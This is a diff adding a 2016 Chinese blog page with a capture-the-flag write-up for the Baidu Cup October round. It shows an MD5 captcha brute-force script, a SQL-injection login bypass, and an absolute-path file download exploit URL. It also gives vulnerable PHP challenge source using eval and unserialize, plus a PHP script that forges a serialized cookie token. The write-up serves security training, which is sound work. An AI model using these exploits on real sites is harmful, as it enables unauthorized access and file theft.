@@ -1,0 +1,214 @@
+	<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>百度杯十月场1 | 凡尘</title>
+  <meta name="author" content="George Lee">
+  
+  <meta name="description" content="Nothing is difficult to the man who will try.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="百度杯十月场1"/>
+  <meta property="og:site_name" content="凡尘"/>
+
+  
+  
+		<!-- favicon -->
+		<link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
+		<link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png">
+		<link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png">
+		<link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png">
+		<link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png">
+		<link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png">
+		<link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png">
+		<link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png">
+		<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+		<link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+		<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+		<link rel="manifest" href="/manifest.json">
+		<meta name="msapplication-TileColor" content="#009688">
+		<meta name="msapplication-TileImage" content="/mstile-144x144.png">
+		<meta name="theme-color" content="#009688">
+		<!-- favicon end -->
+    <!-- <link href="/favicon.ico" rel="icon"> -->
+  
+
+  <!-- toc -->
+  <link rel="stylesheet" href="/libs/tocify/jquery.tocify.css" media="screen" type="text/css">
+
+  <!-- <link rel="stylesheet" href="/libs/bs/css/bootstrap.min.css" media="screen" type="text/css"> -->
+  <link rel="stylesheet" href="//apps.bdimg.com/libs/bootstrap/3.3.4/css/bootstrap.min.css" media="screen" type="text/css">
+
+  <!-- material design -->
+	<!-- <link rel="stylesheet" href="/libs/bs-material/css/ripples.min.css" media="screen" type="text/css"> -->
+  <link rel="stylesheet" href="//apps.bdimg.com/libs/bootstrap-material/0.3.0/css/ripples.min.css" media="screen" type="text/css">
+  <!-- <link rel="stylesheet" href="/libs/bs-material/css/material.min.css" media="screen" type="text/css"> -->
+	<link rel="stylesheet" href="//apps.bdimg.com/libs/bootstrap-material/0.3.0/css/material.min.css" media="screen" type="text/css">
+
+  <link rel="stylesheet" href="/css/highlight.light.css" media="screen" type="text/css">
+
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+  
+
+  
+
+  <script src="//apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script>
+	<script>window.jQuery || document.write('<script src="/libs/jquery-2.0.3.min.js" type="text/javascript"><\/script>')</script>
+
+</head>
+
+ 	<body>
+	  <nav class="navbar navbar-default">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+            <span class="sr-only">菜单</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">凡尘</a>
+        </div>
+        <div id="navbar" class="collapse navbar-collapse">
+            <ul class="nav navbar-nav navbar-right">
+                
+                <li>
+                    <a href="/" title="">
+                    <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="/archives" title="">
+                    <i class="fa fa-list"></i>存档
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="/about" title="">
+                    <i class="fa fa-info-circle"></i>关于
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="/atom.xml" title="这是一个订阅源">
+                    <i class="fa fa-rss"></i>RSS
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</nav>
+
+	  <div class="container" >
+	    <div class="row">
+	
+	<div class="col-md-9 center-content">
+	
+
+		<div class="content">
+			<!-- index -->
+		   
+
+			  		<h2>百度杯十月场1</h2>
+					
+					<div>
+						<span class="post-time">2016-10-20 14:09:19</span>
+					</div>	
+					
+
+					<div class="article-content">
+						<h4 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h4><p><strong>1、</strong></p>
+<p>首先是要登陆，但是登陆要验证码，算法已经给出了，写个脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import md5</div><div class="line">for x in range(1,10000000):</div><div class="line">	y = str(x)</div><div class="line">	z = md5.new(y).hexdigest()</div><div class="line">	#print z</div><div class="line">	if z[0:6] == &apos;XXXXXX&apos;:</div><div class="line">		print x</div></pre></td></tr></table></figure>
+<a id="more"></a>
+<p><strong>2、</strong></p>
+<p>测试用户名，加引号报错。利用经典万能密码绕过</p>
+<p><img src="http://obh16g4rw.bkt.clouddn.com/27.png" alt=""></p>
+<p><strong>3、</strong></p>
+<p>三个文件都没有什么用，但是给了新的提示</p>
+<p><code>./file/download.php?f=hello.txt</code></p>
+<p>尝试../遍历，无奈被过滤了，那就尝试绝对路径，猜测绝对路径</p>
+<p><code>/var/www/html/Challenges/flag</code></p>
+<p>exp:<code>download.php?f=/var/www/html/Challenges/flag.php</code></p>
+<p><strong>4、</strong>源码放上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$f = $_POST[&apos;flag&apos;];</div><div class="line">$f = str_replace(array(&apos;`&apos;, &apos;$&apos;, &apos;*&apos;, &apos;#&apos;, &apos;:&apos;, &apos;\\&apos;, &apos;&quot;&apos;, &quot;&apos;&quot;, &apos;(&apos;, &apos;)&apos;, &apos;.&apos;, &apos;&gt;&apos;), &apos;&apos;, $f);</div><div class="line">if((strlen($f) &gt; 13) || (false !== stripos($f, &apos;return&apos;)))</div><div class="line">&#123;</div><div class="line">		die(&apos;wowwwwwwwwwwwwwwwwwwwwwwwww&apos;);</div><div class="line">&#125;</div><div class="line">try</div><div class="line">&#123;</div><div class="line">		 eval(&quot;\$spaceone = $f&quot;);</div><div class="line">&#125;</div><div class="line">catch (Exception $e)</div><div class="line">&#123;</div><div class="line">		return false;</div><div class="line">&#125;</div><div class="line">if ($spaceone === &apos;flag&apos;)&#123;</div><div class="line">	echo file_get_contents(&quot;helloctf.php&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><strong>5、</strong></p>
+<p>helloctf.php做了权限，不能下载，只能按照源码的步骤一步步地来。</p>
+<p>POST的flag赋值给$spaceone，然后和字符串’flag’比较。（这里需要”;”）</p>
+<p><img src="http://obh16g4rw.bkt.clouddn.com/28.png" alt=""></p>
+<p>flag在源码里面</p>
+<h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>公众号回复“百度杯么么哒”</p>
+<h4 id="我要变成一只程序猿"><a href="#我要变成一只程序猿" class="headerlink" title="我要变成一只程序猿"></a>我要变成一只程序猿</h4><p>倒序输出字符串</p>
+<h4 id="那些年我追过的贝斯"><a href="#那些年我追过的贝斯" class="headerlink" title="那些年我追过的贝斯"></a>那些年我追过的贝斯</h4><p>base64</p>
+<h4 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h4><p><strong>1、</strong></p>
+<p>源代码提示，test1/test1</p>
+<p><strong>2、</strong></p>
+<p>在登录时，发生302，在跳转结束发现响应包里多了一个show字段，在请求头中加入show为1，返回member.php的源代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">	include &apos;common.php&apos;;</div><div class="line">	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</div><div class="line">	class db</div><div class="line">	&#123;</div><div class="line">		public $where;</div><div class="line">		function __wakeup()</div><div class="line">		&#123;</div><div class="line">			if(!empty($this-&gt;where))</div><div class="line">			&#123;</div><div class="line">				$this-&gt;select($this-&gt;where);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function select($where)</div><div class="line">		&#123;</div><div class="line">			$sql = mysql_query(&apos;select * from user where &apos;.$where);</div><div class="line">			return @mysql_fetch_array($sql);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if(isset($requset[&apos;token&apos;]))</div><div class="line">	&#123;</div><div class="line">		$login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;])));</div><div class="line">		$db = new db();</div><div class="line">		$row = $db-&gt;select(&apos;user=\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\&apos;&apos;);</div><div class="line">		if($login[&apos;user&apos;] === &apos;ichunqiu&apos;)</div><div class="line">		&#123;</div><div class="line">			echo $flag;</div><div class="line">		&#125;else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;])&#123;</div><div class="line">			echo &apos;unserialize injection!!&apos;;</div><div class="line">		&#125;else&#123;</div><div class="line">			echo &quot;(╯‵□′)╯︵┴─┴ &quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;else&#123;</div><div class="line">		header(&apos;Location: index.php?error=1&apos;);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><strong>3、</strong></p>
+<p>用PHP写一段反向编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$request = array_merge($_GET,$_POST,$_COOKIE);</div><div class="line">$arr = array(&apos;user&apos; =&gt; &apos;ichunqiu&apos;);</div><div class="line">$a = base64_encode(gzcompress(serialize($arr)));</div><div class="line">$login = unserialize(gzuncompress(base64_decode($a)));</div><div class="line">echo $a;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><strong>4、</strong></p>
+<p>把输出的$a值放到cookie中的token值上。<br>因为session中登陆时添加了token参数，<br>所以在session前面的get，<br>post数组会被覆盖所以只能用cookie，最后getflag。</p>
+<p><img src="http://obh16g4rw.bkt.clouddn.com/29.png" alt=""></p>
+
+					</div>
+
+			  <!-- about -->
+			  
+		</div>
+
+		<!-- pagination -->
+	  
+
+		<div class="comment-section">
+  
+  
+
+
+</div>
+	</div>
+
+	
+
+</div>
+
+
+		<footer>
+			
+
+<p>
+  由 <a href="https://hexo.io">hexo</a> 强力驱动 | 搭载 <a href="https://github.com/wayou/hexo-theme-material">material</a> 主题
+</p>
+<p>
+  &copy; 2017 <a href="http://yoursite.com"> George Lee </a>
+</p>
+<a id="gotop" href="#" title="back to top"><i class="mdi-hardware-keyboard-arrow-up"></i></a>
+
+		</footer>
+	  </div>
+
+		<!-- <script src="/libs/bs/js/bootstrap.min.js"></script> -->
+		<script src="//apps.bdimg.com/libs/bootstrap/3.3.4/js/bootstrap.min.js"></script>
+		<script>(typeof $().modal == 'function')|| document.write('<script src="/libs/bs/js/bootstrap.min.js" type="text/javascript"><\/script>')</script>
+
+		<!-- material design -->
+		<!-- <script src="/libs/bs-material/js/ripples.min.js"></script> -->
+		<script src="//apps.bdimg.com/libs/bootstrap-material/0.3.0/js/ripples.min.js"></script>
+		<!-- <script src="/libs/bs-material/js/material.min.js"></script> -->
+		<script src="//apps.bdimg.com/libs/bootstrap-material/0.3.0/js/material.min.js"></script>
+		<!-- toc -->
+		<!-- <script src="/libs/tocify/jquery-ui.min.js"></script> -->
+		<script src="//apps.bdimg.com/libs/jqueryui/1.10.4/jquery-ui.min.js"></script>
+		<script src="/libs/tocify/jquery.tocify.custom.js"></script>
+
+		<script src="/js/main.js"></script>
+
+	</body>
+</html>
